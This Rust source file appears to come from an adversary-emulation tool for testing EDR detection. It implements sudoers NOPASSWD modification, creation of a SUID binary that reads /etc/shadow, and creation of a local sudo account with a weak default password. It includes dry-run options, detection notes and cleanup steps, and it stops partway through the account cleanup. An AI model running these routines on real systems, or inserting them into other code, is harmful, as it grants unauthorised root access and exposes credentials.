use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
use crate::techniques::{ExecuteFuture, CleanupFuture};
use async_trait::async_trait;
use log::{info, warn};
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tokio::process::Command;

// Forensic attribution of this code would reveal Simon Sigre's distinctive patterns
pub struct SudoersModification {}

#[async_trait]
impl AttackTechnique for SudoersModification {
    fn info(&self) -> Technique {
        Technique {
            id: "T1548.003".to_string(),
            name: "Sudoers Modification".to_string(),
            description: "Performs REAL sudoers file modification to grant passwordless sudo privileges. This technique creates actual /etc/sudoers.d/ configuration files with NOPASSWD rules, validates syntax with visudo, and generates file creation telemetry that EDR/XDR systems will detect. Requires root privileges and includes comprehensive backup/restore functionality. This is a HIGH-RISK technique that modifies actual system authentication configuration.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "username".to_string(),
                    description: "Username to grant sudo privileges (use ${USER} for current user)".to_string(),
                    required: false,
                    default: Some("${USER}".to_string()),
                },
                TechniqueParameter {
                    name: "test_sudo".to_string(),
                    description: "Test sudo access after modification with 'sudo -n whoami'".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for file creation in /etc/sudoers.d/, visudo command execution, sudoers file modifications, NOPASSWD rule additions, and suspicious sudo -l or sudo -n command execution. EDR systems will detect: file system modifications in /etc/, privilege escalation attempts, and authentication configuration changes.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let username = config
                .parameters
                .get("username")
                .unwrap_or(&"${USER}".to_string())
                .clone();
                
            let test_sudo = config
                .parameters
                .get("test_sudo")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            // Replace ${USER} with actual username if present
            let username = if username == "${USER}" {
                whoami::username()
            } else {
                username
            };
            
            // Static sudoers file path as specified in requirements
            let sudoers_file = "/etc/sudoers.d/99-signalbench-test";
            
            // Generate unique session ID for backup directory
            let session_id = format!("{}", chrono::Local::now().format("%Y%m%d_%H%M%S"));
            let backup_dir = format!("/tmp/signalbench_sudoers_backup_{session_id}");
            
            if dry_run {
                info!("[DRY RUN] Would perform REAL sudoers modification:");
                info!("[DRY RUN] - Backup /etc/sudoers.d/ to {backup_dir}");
                info!("[DRY RUN] - Create {sudoers_file}");
                info!("[DRY RUN] - Add NOPASSWD rule: {username} ALL=(ALL) NOPASSWD: ALL");
                info!("[DRY RUN] - Validate syntax with visudo");
                info!("[DRY RUN] - Set permissions: chmod 440");
                if test_sudo {
                    info!("[DRY RUN] - Test sudo access with: sudo -n whoami");
                }
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would perform REAL sudoers modification for {username}"),
                    artifacts: vec![
                        sudoers_file.to_string(),
                        format!("backup:{backup_dir}"),
                    ],
                    cleanup_required: false,
                });
            }

            // Check if running as root
            let uid = unsafe { libc::geteuid() };
            if uid != 0 {
                warn!("This technique requires root privileges for REAL sudoers modification");
                return Err("This technique requires root privileges. Run with sudo or as root user.".to_string());
            }
            
            info!("Starting REAL sudoers modification - This will be detected by security tools!");
            info!("Target user: {username}");
            
            // STEP 1: Create backup directory
            info!("Step 1: Creating backup directory: {backup_dir}");
            fs::create_dir_all(&backup_dir)
                .map_err(|e| format!("Failed to create backup directory: {e}"))?;
            info!("✓ Backup directory created");
            
            // STEP 2: List and backup existing /etc/sudoers.d/ files
            info!("Step 2: Backing up existing /etc/sudoers.d/ files");
            let sudoers_d_path = "/etc/sudoers.d";
            let mut backup_count = 0;
            
            if Path::new(sudoers_d_path).exists() {
                if let Ok(entries) = fs::read_dir(sudoers_d_path) {
                    for entry in entries.flatten() {
                        if let Ok(file_type) = entry.file_type() {
                            if file_type.is_file() {
                                let file_name = entry.file_name();
                                let source = entry.path();
                                let dest = Path::new(&backup_dir).join(&file_name);
                                
                                match fs::copy(&source, &dest) {
                                    Ok(_) => {
                                        backup_count += 1;
                                        info!("  ✓ Backed up: {}", file_name.to_string_lossy());
                                    }
                                    Err(e) => {
                                        warn!("  ✗ Failed to backup {}: {}", file_name.to_string_lossy(), e);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            
            if backup_count > 0 {
                info!("✓ Backed up {backup_count} existing sudoers.d files to {backup_dir}");
            } else {
                info!("✓ No existing sudoers.d files to backup");
            }
            
            // STEP 3: Create the sudoers file content
            info!("Step 3: Creating sudoers configuration for {username}");
            let sudoers_content = format!(
                "# Added by SignalBench - GoCortex.io - FOR TESTING ONLY\n\
                 # MITRE ATT&CK Technique: T1548.003 - Sudoers Modification\n\
                 # Timestamp: {}\n\
                 # Grants passwordless sudo access - REAL privilege escalation\n\
                 {username} ALL=(ALL) NOPASSWD: ALL\n",
                chrono::Local::now()
            );
            
            // Create a temporary file first for validation
            let temp_file = format!("/tmp/signalbench_sudoers_temp_{session_id}");
            let mut file = File::create(&temp_file)
                .map_err(|e| format!("Failed to create temporary file: {e}"))?;
                
            file.write_all(sudoers_content.as_bytes())
                .map_err(|e| format!("Failed to write to temporary file: {e}"))?;
            
            info!("✓ Created temporary sudoers file for validation");
            
            // STEP 4: Validate syntax using visudo
            info!("Step 4: Validating sudoers syntax with visudo");
            let status = Command::new("visudo")
                .args(["-c", "-f", &temp_file])
                .output()
                .await
                .map_err(|e| format!("Failed to run visudo: {e}"))?;
                
            if !status.status.success() {
                fs::remove_file(&temp_file).ok();
                let error_output = String::from_utf8_lossy(&status.stderr);
                return Err(format!("Sudoers syntax validation failed: {error_output}"));
            }
            
            info!("✓ Sudoers syntax validation passed");
            
            // STEP 5: Move the validated file to /etc/sudoers.d/
            info!("Step 5: Installing sudoers file to {sudoers_file}");
            let status = Command::new("mv")
                .args([&temp_file, sudoers_file])
                .status()
                .await
                .map_err(|e| format!("Failed to move file to sudoers.d: {e}"))?;
                
            if !status.success() {
                fs::remove_file(&temp_file).ok();
                return Err("Failed to install sudoers file to /etc/sudoers.d/".to_string());
            }
            
            info!("✓ Sudoers file installed at {sudoers_file}");
            
            // STEP 6: Set correct permissions (440)
            info!("Step 6: Setting permissions to 440 (r--r-----)");
            let status = Command::new("chmod")
                .args(["440", sudoers_file])
                .status()
                .await
                .map_err(|e| format!("Failed to set permissions: {e}"))?;
                
            if !status.success() {
                // Critical failure - remove the file
                fs::remove_file(sudoers_file).ok();
                return Err("Failed to set correct permissions on sudoers file - file removed for safety".to_string());
            }
            
            info!("✓ Permissions set to 440");
            
            // STEP 7: Validate the installed file one more time
            info!("Step 7: Final validation of installed sudoers file");
            let status = Command::new("visudo")
                .args(["-c", "-f", sudoers_file])
                .output()
                .await
                .map_err(|e| format!("Failed to run final visudo check: {e}"))?;
                
            if !status.status.success() {
                // Critical failure - remove the file immediately
                warn!("Final validation failed - removing sudoers file for safety!");
                fs::remove_file(sudoers_file).ok();
                let error_output = String::from_utf8_lossy(&status.stderr);
                return Err(format!("Final sudoers validation failed, file removed: {error_output}"));
            }
            
            info!("✓ Final validation passed - sudoers file is active");
            
            // STEP 8: Optional - Test sudo access
            let mut test_result = String::new();
            if test_sudo {
                info!("Step 8: Testing sudo access with 'sudo -n whoami'");
                let test_output = Command::new("sudo")
                    .args(["-n", "-u", &username, "whoami"])
                    .output()
                    .await;
                    
                match test_output {
                    Ok(output) if output.status.success() => {
                        let whoami = String::from_utf8_lossy(&output.stdout);
                        info!("✓ Sudo test SUCCESSFUL - executed as: {}", whoami.trim());
                        test_result = format!("\n  ✓ Sudo test: SUCCESSFUL (whoami: {})", whoami.trim());
                    }
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        warn!("✗ Sudo test failed: {}", stderr.trim());
                        test_result = format!("\n  ✗ Sudo test: FAILED - {}", stderr.trim());
                    }
                    Err(e) => {
                        warn!("✗ Sudo test error: {e}");
                        test_result = format!("\n  ✗ Sudo test: ERROR - {e}");
                    }
                }
            }
            
            let success_message = format!(
                "Successfully performed REAL sudoers modification:\n  \
                ✓ Backed up {backup_count} existing files to {backup_dir}\n  \
                ✓ Created {sudoers_file}\n  \
                ✓ Added NOPASSWD rule: {username} ALL=(ALL) NOPASSWD: ALL\n  \
                ✓ Validated syntax with visudo\n  \
                ✓ Set permissions: 440 (r--r-----)\n  \
                ✓ File is now ACTIVE and will grant passwordless sudo to {username}{test_result}"
            );
            
            info!("{success_message}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: success_message,
                artifacts: vec![
                    sudoers_file.to_string(),
                    format!("backup:{backup_dir}"),
                ],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            // Check if running as root
            let uid = unsafe { libc::geteuid() };
            if uid != 0 {
                return Err("Cleanup for this technique requires root privileges".to_string());
            }
            
            info!("Starting comprehensive sudoers modification cleanup");
            
            let mut backup_dir: Option<String> = None;
            let mut sudoers_file: Option<String> = None;
            
            // Parse artifacts
            for artifact in artifacts {
                if artifact.starts_with("backup:") {
                    backup_dir = Some(artifact.trim_start_matches("backup:").to_string());
                } else if artifact.contains("/etc/sudoers.d/") {
                    sudoers_file = Some(artifact.clone());
                }
            }
            
            // STEP 1: Remove the sudoers file
            if let Some(file) = &sudoers_file {
                info!("Step 1: Removing sudoers file: {file}");
                if Path::new(file).exists() {
                    match fs::remove_file(file) {
                        Ok(_) => {
                            info!("✓ Removed sudoers file: {file}");
                            
                            // Verify removal
                            if !Path::new(file).exists() {
                                info!("✓ Verified: {file} successfully deleted");
                            } else {
                                warn!("✗ Warning: {file} still exists after deletion attempt");
                            }
                        }
                        Err(e) => {
                            warn!("✗ Failed to remove sudoers file {file}: {e}");
                        }
                    }
                } else {
                    info!("  Sudoers file {file} does not exist (already removed)");
                }
            }
            
            // STEP 2: Restore from backup if needed (safety check)
            if let Some(backup_path) = &backup_dir {
                info!("Step 2: Checking backup directory for any files to restore");
                if Path::new(backup_path).exists() {
                    let mut restored_count = 0;
                    
                    if let Ok(entries) = fs::read_dir(backup_path) {
                        for entry in entries.flatten() {
                            if let Ok(file_type) = entry.file_type() {
                                if file_type.is_file() {
                                    let file_name = entry.file_name();
                                    
                                    // Skip our test file if it's in backup
                                    if file_name == "99-signalbench-test" {
                                        continue;
                                    }
                                    
                                    let source = entry.path();
                                    let dest = Path::new("/etc/sudoers.d").join(&file_name);
                                    
                                    // Only restore if the file doesn't currently exist
                                    if !dest.exists() {
                                        match fs::copy(&source, &dest) {
                                            Ok(_) => {
                                                restored_count += 1;
                                                info!("  ✓ Restored: {}", file_name.to_string_lossy());
                                            }
                                            Err(e) => {
                                                warn!("  ✗ Failed to restore {}: {}", file_name.to_string_lossy(), e);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    
                    if restored_count > 0 {
                        info!("✓ Restored {restored_count} files from backup");
                    } else {
                        info!("✓ No files needed restoration (system intact)");
                    }
                } else {
                    info!("  Backup directory {backup_path} does not exist");
                }
            }
            
            // STEP 3: Remove backup directory
            if let Some(backup_path) = &backup_dir {
                info!("Step 3: Removing backup directory: {backup_path}");
                if Path::new(backup_path).exists() {
                    match fs::remove_dir_all(backup_path) {
                        Ok(_) => {
                            info!("✓ Removed backup directory: {backup_path}");
                            
                            // Verify removal
                            if !Path::new(backup_path).exists() {
                                info!("✓ Verified: backup directory successfully deleted");
                            } else {
                                warn!("✗ Warning: backup directory still exists after deletion");
                            }
                        }
                        Err(e) => {
                            warn!("✗ Failed to remove backup directory {backup_path}: {e}");
                        }
                    }
                } else {
                    info!("  Backup directory {backup_path} does not exist (already removed)");
                }
            }
            
            info!("✓ Comprehensive sudoers modification cleanup completed");
            Ok(())
        })
    }
}

pub struct SuidBinary {}

#[async_trait]
impl AttackTechnique for SuidBinary {
    fn info(&self) -> Technique {
        Technique {
            id: "T1548.001".to_string(),
            name: "SUID Binary Creation".to_string(),
            description: "Performs REAL SUID binary creation to demonstrate privilege escalation. This technique creates an actual compiled C binary with privileged operations (reads /etc/shadow), sets the SUID bit to enable privilege escalation, and generates binary creation and SUID chmod telemetry that EDR/XDR systems will detect. Requires root privileges and includes comprehensive cleanup. This is a HIGH-RISK technique that creates actual privilege escalation vectors on the system.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "test_execution".to_string(),
                    description: "Test execution of SUID binary to demonstrate privilege escalation".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for gcc compilation commands, new binary creation in /tmp/, SUID bit modifications (chmod u+s), file permission changes to 'rws', chown operations to root, and execution of newly created SUID binaries. EDR systems will detect: binary compilation events, SUID file system modifications, privilege escalation attempts, and unauthorised access to sensitive files like /etc/shadow.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let test_execution = config
                .parameters
                .get("test_execution")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            // Generate unique session ID for files
            let session_id = format!("{}", chrono::Local::now().format("%Y%m%d_%H%M%S"));
            let source_file = format!("/tmp/signalbench_suid_test_{session_id}.c");
            let binary_file = "/tmp/signalbench_suid_test".to_string();
            
            if dry_run {
                info!("[DRY RUN] Would perform REAL SUID binary creation:");
                info!("[DRY RUN] - Create C source: {source_file}");
                info!("[DRY RUN] - Compile with gcc: gcc -o {binary_file} {source_file}");
                info!("[DRY RUN] - Set SUID bit: chmod u+s {binary_file}");
                info!("[DRY RUN] - Change ownership: chown root:root {binary_file}");
                info!("[DRY RUN] - Verify SUID bit set (rws permissions)");
                if test_execution {
                    info!("[DRY RUN] - Test execution to demonstrate privilege escalation");
                }
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would perform REAL SUID binary creation with privilege escalation".to_string(),
                    artifacts: vec![
                        format!("source:{source_file}"),
                        format!("binary:{binary_file}"),
                    ],
                    cleanup_required: false,
                });
            }

            // Check if running as root
            let uid = unsafe { libc::geteuid() };
            if uid != 0 {
                warn!("This technique requires root privileges for REAL SUID binary creation");
                return Err("This technique requires root privileges. Run with sudo or as root user.".to_string());
            }
            
            info!("Starting REAL SUID binary creation - This will be detected by security tools!");
            
            // STEP 1: Create C source code with privileged operations
            info!("Step 1: Creating C source code: {source_file}");
            let c_source_code = r#"/*
 * SignalBench SUID Test Binary - GoCortex.io
 * MITRE ATT&CK Technique: T1548.001 - SUID Binary Creation
 * FOR TESTING PURPOSES ONLY
 * 
 * This binary attempts to read /etc/shadow to demonstrate privilege escalation.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

int main() {
    printf("=== SignalBench SUID Binary Test ===\n");
    printf("Real UID: %d, Effective UID: %d\n", getuid(), geteuid());
    printf("Real GID: %d, Effective GID: %d\n", getgid(), getegid());
    
    // Attempt to read /etc/shadow (requires root privileges)
    FILE *shadow_file = fopen("/etc/shadow", "r");
    
    if (shadow_file != NULL) {
        printf("\n[SUCCESS] Opened /etc/shadow - privilege escalation demonstrated!\n");
        printf("Reading first line of /etc/shadow:\n");
        
        char buffer[256];
        if (fgets(buffer, sizeof(buffer), shadow_file) != NULL) {
            printf("  %s", buffer);
        }
        
        fclose(shadow_file);
        printf("\n[INFO] SUID binary successfully accessed privileged file.\n");
        return 0;
    } else {
        printf("\n[FAILED] Could not open /etc/shadow: %s\n", strerror(errno));
        printf("[INFO] SUID bit may not be set correctly or not running as root-owned binary.\n");
        return 1;
    }
}
"#;
            
            // Write C source to file
            let mut file = File::create(&source_file)
                .map_err(|e| format!("Failed to create source file: {e}"))?;
                
            file.write_all(c_source_code.as_bytes())
                .map_err(|e| format!("Failed to write to source file: {e}"))?;
            
            info!("✓ Created C source file: {source_file}");
            
            // STEP 2: Compile the C source code using gcc
            info!("Step 2: Compiling C source with gcc");
            let compile_output = Command::new("gcc")
                .args(["-o", &binary_file, &source_file])
                .output()
                .await
                .map_err(|e| format!("Failed to execute gcc: {e}"))?;
                
            if !compile_output.status.success() {
                // Clean up source file
                fs::remove_file(&source_file).ok();
                let stderr = String::from_utf8_lossy(&compile_output.stderr);
                return Err(format!("Compilation failed: {stderr}"));
            }
            
            info!("✓ Binary compiled successfully: {binary_file}");
            
            // Verify binary was created
            if !Path::new(&binary_file).exists() {
                fs::remove_file(&source_file).ok();
                return Err(format!("Binary file was not created at {binary_file}"));
            }
            
            // STEP 3: Change ownership to root:root
            info!("Step 3: Changing ownership to root:root");
            let status = Command::new("chown")
                .args(["root:root", &binary_file])
                .status()
                .await
                .map_err(|e| format!("Failed to change ownership: {e}"))?;
                
            if !status.success() {
                // Clean up
                fs::remove_file(&binary_file).ok();
                fs::remove_file(&source_file).ok();
                return Err("Failed to change ownership to root:root".to_string());
            }
            
            info!("✓ Ownership changed to root:root");
            
            // STEP 4: Set SUID bit
            info!("Step 4: Setting SUID bit (chmod u+s)");
            let status = Command::new("chmod")
                .args(["u+s", &binary_file])
                .status()
                .await
                .map_err(|e| format!("Failed to set SUID bit: {e}"))?;
                
            if !status.success() {
                // Clean up
                fs::remove_file(&binary_file).ok();
                fs::remove_file(&source_file).ok();
                return Err("Failed to set SUID bit".to_string());
            }
            
            info!("✓ SUID bit set on binary");
            
            // STEP 5: Verify SUID bit is set
            info!("Step 5: Verifying SUID bit with ls -la");
            let ls_output = Command::new("ls")
                .args(["-la", &binary_file])
                .output()
                .await
                .map_err(|e| format!("Failed to run ls: {e}"))?;
                
            if ls_output.status.success() {
                let ls_result = String::from_utf8_lossy(&ls_output.stdout);
                info!("Binary permissions: {}", ls_result.trim());
                
                // Check if 'rws' is present (SUID bit indicator)
                if ls_result.contains("rws") {
                    info!("✓ SUID bit verified (rws permissions visible)");
                } else {
                    warn!("✗ Warning: SUID bit may not be set correctly - 'rws' not found in permissions");
                }
            } else {
                warn!("Could not verify SUID bit with ls");
            }
            
            // Additional verification with stat
            let stat_output = Command::new("stat")
                .args(["-c", "%a %A", &binary_file])
                .output()
                .await;
                
            if let Ok(output) = stat_output {
                if output.status.success() {
                    let stat_result = String::from_utf8_lossy(&output.stdout);
                    info!("Stat verification: {}", stat_result.trim());
                }
            }
            
            // STEP 6: Optional - Test execution
            let mut test_result = String::new();
            if test_execution {
                info!("Step 6: Testing SUID binary execution to demonstrate privilege escalation");
                
                // Execute the SUID binary
                let exec_output = Command::new(&binary_file)
                    .output()
                    .await;
                    
                match exec_output {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        
                        if output.status.success() {
                            info!("✓ SUID binary executed successfully");
                            info!("Output:\n{stdout}");
                            test_result = "\n  ✓ Test execution: SUCCESS - Privilege escalation demonstrated\n  \
                                ✓ Binary successfully accessed /etc/shadow".to_string();
                        } else {
                            warn!("✗ SUID binary execution failed");
                            if !stderr.is_empty() {
                                warn!("Error output: {stderr}");
                            }
                            test_result = "\n  ✗ Test execution: FAILED - Binary ran but could not access privileged file".to_string();
                        }
                        
                        if !stdout.is_empty() {
                            info!("Binary output: {stdout}");
                        }
                    }
                    Err(e) => {
                        warn!("✗ Failed to execute SUID binary: {e}");
                        test_result = format!("\n  ✗ Test execution: ERROR - {e}");
                    }
                }
            }
            
            let success_message = format!(
                "Successfully performed REAL SUID binary creation:\n  \
                ✓ Created C source file: {source_file}\n  \
                ✓ Compiled binary with gcc: {binary_file}\n  \
                ✓ Changed ownership to root:root\n  \
                ✓ Set SUID bit (chmod u+s)\n  \
                ✓ Verified SUID bit set (rws permissions)\n  \
                ✓ Binary is now ACTIVE and can escalate privileges{test_result}"
            );
            
            info!("{success_message}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: success_message,
                artifacts: vec![
                    format!("source:{source_file}"),
                    format!("binary:{binary_file}"),
                ],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            // Check if running as root
            let uid = unsafe { libc::geteuid() };
            if uid != 0 {
                return Err("Cleanup for this technique requires root privileges".to_string());
            }
            
            info!("Starting comprehensive SUID binary cleanup");
            
            let mut source_file: Option<String> = None;
            let mut binary_file: Option<String> = None;
            
            // Parse artifacts
            for artifact in artifacts {
                if artifact.starts_with("source:") {
                    source_file = Some(artifact.trim_start_matches("source:").to_string());
                } else if artifact.starts_with("binary:") {
                    binary_file = Some(artifact.trim_start_matches("binary:").to_string());
                }
            }
            
            // STEP 1: Remove SUID bit first (safety measure)
            if let Some(binary) = &binary_file {
                if Path::new(binary).exists() {
                    info!("Step 1: Removing SUID bit from binary: {binary}");
                    let status = Command::new("chmod")
                        .args(["u-s", binary])
                        .status()
                        .await;
                        
                    match status {
                        Ok(status) if status.success() => {
                            info!("✓ Removed SUID bit from {binary}");
                        }
                        Ok(_) => {
                            warn!("✗ Failed to remove SUID bit from {binary}");
                        }
                        Err(e) => {
                            warn!("✗ Error removing SUID bit: {e}");
                        }
                    }
                    
                    // Verify SUID bit removed
                    let ls_output = Command::new("ls")
                        .args(["-la", binary])
                        .output()
                        .await;
                        
                    if let Ok(output) = ls_output {
                        if output.status.success() {
                            let ls_result = String::from_utf8_lossy(&output.stdout);
                            if !ls_result.contains("rws") {
                                info!("✓ Verified: SUID bit successfully removed (no 'rws' in permissions)");
                            } else {
                                warn!("✗ Warning: SUID bit may still be set");
                            }
                        }
                    }
                } else {
                    info!("  Binary {binary} does not exist (already removed)");
                }
            }
            
            // STEP 2: Delete the binary file
            if let Some(binary) = &binary_file {
                info!("Step 2: Deleting binary file: {binary}");
                if Path::new(binary).exists() {
                    match fs::remove_file(binary) {
                        Ok(_) => {
                            info!("✓ Removed binary file: {binary}");
                            
                            // Verify removal
                            if !Path::new(binary).exists() {
                                info!("✓ Verified: binary file successfully deleted");
                            } else {
                                warn!("✗ Warning: binary file still exists after deletion");
                            }
                        }
                        Err(e) => {
                            warn!("✗ Failed to remove binary file {binary}: {e}");
                        }
                    }
                } else {
                    info!("  Binary file {binary} does not exist (already removed)");
                }
            }
            
            // STEP 3: Delete the source file
            if let Some(source) = &source_file {
                info!("Step 3: Deleting source file: {source}");
                if Path::new(source).exists() {
                    match fs::remove_file(source) {
                        Ok(_) => {
                            info!("✓ Removed source file: {source}");
                            
                            // Verify removal
                            if !Path::new(source).exists() {
                                info!("✓ Verified: source file successfully deleted");
                            } else {
                                warn!("✗ Warning: source file still exists after deletion");
                            }
                        }
                        Err(e) => {
                            warn!("✗ Failed to remove source file {source}: {e}");
                        }
                    }
                } else {
                    info!("  Source file {source} does not exist (already removed)");
                }
            }
            
            info!("✓ Comprehensive SUID binary cleanup completed");
            Ok(())
        })
    }
}


pub struct LocalAccountCreation {}

#[async_trait]
impl AttackTechnique for LocalAccountCreation {
    fn info(&self) -> Technique {
        Technique {
            id: "T1136.001".to_string(),
            name: "Local Account Creation".to_string(),
            description: "Creates REAL local user accounts with sudo access, password, SSH keys, and proper home directory setup. This technique creates persistent privileged accounts on the system and requires root privileges. WARNING: This creates actual system accounts that persist until cleaned up.".to_string(),
            category: "privilege_escalation".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "username".to_string(),
                    description: "Username for the new account".to_string(),
                    required: false,
                    default: Some("signalbench_test".to_string()),
                },
                TechniqueParameter {
                    name: "password".to_string(),
                    description: "Password for the new account".to_string(),
                    required: false,
                    default: Some("password".to_string()),
                },
            ],
            detection: "Monitor for new user account creation, changes to /etc/passwd, /etc/shadow, unusual useradd/usermod commands, SSH key generation, and sudo group modifications".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let username = config.parameters.get("username").unwrap_or(&"signalbench_test".to_string()).clone();
            let password = config.parameters.get("password").unwrap_or(&"password".to_string()).clone();
            
            if dry_run {
                info!("[DRY RUN] Would create REAL user account: {username}");
                info!("[DRY RUN] Would set password and add to sudo group");
                info!("[DRY RUN] Would generate SSH keys in /home/{username}/.ssh/");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would create REAL user account {username} with sudo access"),
                    artifacts: vec![format!("user:{username}")],
                    cleanup_required: false,
                });
            }

            // Check if running as root
            let uid = unsafe { libc::geteuid() };
            if uid != 0 {
                return Err("This technique requires root privileges to create real user accounts".to_string());
            }
            
            info!("Creating REAL local user account: {username}");
            
            // Step 1: Check if user already exists
            let check_user = Command::new("id")
                .arg(&username)
                .output()
                .await;
                
            if let Ok(output) = check_user {
                if output.status.success() {
                    return Err(format!("User {username} already exists on the system"));
                }
            }
            
            // Step 2: Create user account with home directory
            info!("Step 1: Creating user account {username} with home directory");
            let status = Command::new("useradd")
                .args(["-m", "-s", "/bin/bash", &username])
                .status()
                .await
                .map_err(|e| format!("Failed to execute useradd command: {e}"))?;
                
            if !status.success() {
                return Err(format!("Failed to create user account {username}"));
            }
            info!("✓ User account {username} created successfully");
            
            // Step 3: Set password for the account
            info!("Step 2: Setting password for {username}");
            let chpasswd_input = format!("{username}:{password}");
            let mut child = Command::new("chpasswd")
                .stdin(std::process::Stdio::piped())
                .spawn()
                .map_err(|e| format!("Failed to spawn chpasswd: {e}"))?;
                
            if let Some(mut stdin) = child.stdin.take() {
                use tokio::io::AsyncWriteExt;
                stdin.write_all(chpasswd_input.as_bytes()).await.ok();
            }
            
            let status = child.wait().await
                .map_err(|e| format!("Failed to set password: {e}"))?;
                
            if !status.success() {
                // Clean up the created user
                let _ = Command::new("userdel").args(["-r", &username]).status().await;
                return Err(format!("Failed to set password for {username}"));
            }
            info!("✓ Password set for {username}");
            
            // Step 4: Add user to sudo/wheel group
            info!("Step 3: Adding {username} to sudo group");
            
            // Try sudo group first (Debian/Ubuntu), then wheel (RedHat/CentOS)
            let mut sudo_added = false;
            for group in &["sudo", "wheel"] {
                let status = Command::new("usermod")
                    .args(["-aG", group, &username])
                    .status()
                    .await;
                    
                if let Ok(status) = status {
                    if status.success() {
                        info!("✓ Added {username} to {group} group for sudo access");
                        sudo_added = true;
                        break;
                    }
                }
            }
            
            if !sudo_added {
                warn!("Could not add user to sudo/wheel group - may not have sudo access");
            }
            
            // Step 5: Generate SSH key pair
            info!("Step 4: Generating SSH key pair for {username}");
            let home_dir = format!("/home/{username}");
            let ssh_dir = format!("{home_dir}/.ssh");
            
            // Create .ssh directory
            let status = Command::new("mkdir")
                .args(["-p", &ssh_dir])
                .status()
                .await
                .map_err(|e| format!("Failed to create .ssh directory: {e}"))?;
                
            if !status.success() {
                warn!("Failed to create .ssh directory");
            } else {
                // Generate SSH key pair
                let ssh_key_path = format!("{ssh_dir}/id_rsa");
                let status = Command::new("ssh-keygen")
                    .args([
                        "-t", "rsa",
                        "-b", "2048",
                        "-f", &ssh_key_path,
                        "-N", "",
                        "-C", &format!("{username}@signalbench_test"),
                    ])
                    .status()
                    .await
                    .map_err(|e| format!("Failed to generate SSH keys: {e}"))?;
                    
                if status.success() {
                    info!("✓ SSH key pair generated at {ssh_key_path}");
                } else {
                    warn!("Failed to generate SSH keys");
                }
            }
            
            // Step 6: Set proper permissions
            info!("Step 5: Setting proper permissions on home directory and .ssh folder");
            
            // Set ownership of home directory
            let chown_cmd = format!("{username}:{username}");
            let status = Command::new("chown")
                .args(["-R", &chown_cmd, &home_dir])
                .status()
                .await
                .map_err(|e| format!("Failed to set ownership: {e}"))?;
                
            if status.success() {
                info!("✓ Set ownership of {home_dir} to {username}");
            }
            
            // Set permissions on .ssh directory
            if Path::new(&ssh_dir).exists() {
                let _ = Command::new("chmod")
                    .args(["700", &ssh_dir])
                    .status()
                    .await;
                    
                let ssh_key_path = format!("{ssh_dir}/id_rsa");
                if Path::new(&ssh_key_path).exists() {
                    let _ = Command::new("chmod")
                        .args(["600", &ssh_key_path])
                        .status()
                        .await;
                }
                
                let ssh_pubkey_path = format!("{ssh_dir}/id_rsa.pub");
                if Path::new(&ssh_pubkey_path).exists() {
                    let _ = Command::new("chmod")
                        .args(["644", &ssh_pubkey_path])
                        .status()
                        .await;
                }
                info!("✓ Set proper permissions on .ssh directory and keys");
            }
            
            // Verify account creation
            let verify = Command::new("id")
                .arg(&username)
                .output()
                .await
                .map_err(|e| format!("Failed to verify user creation: {e}"))?;
                
            if !verify.status.success() {
                return Err(format!("User {username} was created but verification failed"));
            }
            
            let user_info = String::from_utf8_lossy(&verify.stdout);
            info!("Account verification: {}", user_info.trim());
            
            let success_message = format!(
                "Successfully created REAL user account '{username}':\n  \
                ✓ Account created with home directory: {home_dir}\n  \
                ✓ Password set\n  \
                ✓ Sudo access granted (added to sudo/wheel group)\n  \
                ✓ SSH keys generated in {ssh_dir}/\n  \
                ✓ Proper permissions set on home directory and .ssh folder"
            );
            
            info!("{success_message}");
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: success_message,
                artifacts: vec![format!("user:{username}")],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if artifact.starts_with("user:") {
                    let username = artifact.trim_start_matches("user:");
                    
                    // Check if running as root
                    let uid = unsafe { libc::geteuid() };
                    if uid != 0 {
